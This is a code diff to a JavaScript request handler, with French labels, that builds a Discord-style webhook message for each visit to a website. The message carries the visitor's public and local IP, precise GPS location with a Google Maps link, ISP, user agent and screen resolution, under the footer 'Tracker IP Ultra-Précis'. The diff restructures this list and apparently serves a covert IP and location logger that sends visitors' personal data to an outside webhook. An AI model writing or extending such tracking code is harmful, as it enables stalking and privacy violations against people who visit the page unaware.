@@ -64,6 +64,24 @@ export default async function handler(req, res) {
       ? `✅ **LOCALISATION RÉELLE (GPS)**\n**${logEntry.location}**\n\n📍 [Ouvrir dans Google Maps](${mapsLink})\nCoords: \`${logEntry.coords}\`` 
       : `❌ IP Uniquement (Approximatif)\n**${logEntry.location}**\nCoords: \`${logEntry.coords}\``;
 
+    const fields = [
+      { name: "🕒 Date (Paris)", value: logEntry.timestamp, inline: true },
+      { name: "🌐 IP Publique (WiFi)", value: `\`${publicIp}\``, inline: true },
+      { name: "🏠 IP Locale (Appareil)", value: `\`${localIp}\``, inline: true },
+      { name: "📍 Localisation Précise", value: locValue }
+    ];
+
+    // On n'ajoute le fournisseur (ISP) QUE si on n'a pas la localisation GPS
+    if (!logEntry.isPrecise) {
+      fields.push({ name: "📡 Fournisseur (ISP)", value: logEntry.isp });
+    }
+
+    fields.push(
+      { name: "📄 Page", value: logEntry.page },
+      { name: "📱 Appareil", value: `\`${userAgent.substring(0, 250)}\`` },
+      { name: "🖥️ Résolution", value: screenResolution, inline: true }
+    );
+
     try {
       await fetch(webhookUrl, {
         method: 'POST',
@@ -72,16 +90,7 @@ export default async function handler(req, res) {
           embeds: [{
             title: "🚀 Nouvelle Visite sur le Site !",
             color: logEntry.isPrecise ? 0x00FF00 : 0xFFA500,
-            fields: [
-              { name: "🕒 Date (Paris)", value: logEntry.timestamp, inline: true },
-              { name: "🌐 IP Publique (WiFi)", value: `\`${publicIp}\``, inline: true },
-              { name: "🏠 IP Locale (Appareil)", value: `\`${localIp}\``, inline: true },
-              { name: "📍 Localisation Précise", value: locValue },
-              { name: "📡 Fournisseur (ISP)", value: logEntry.isp },
-              { name: "📄 Page", value: logEntry.page },
-              { name: "📱 Appareil", value: `\`${userAgent.substring(0, 250)}\`` },
-              { name: "🖥️ Résolution", value: screenResolution, inline: true }
-            ],
+            fields: fields,
             footer: { text: "Tracker IP Ultra-Précis - Saadaa le Goat" }
           }]
         })
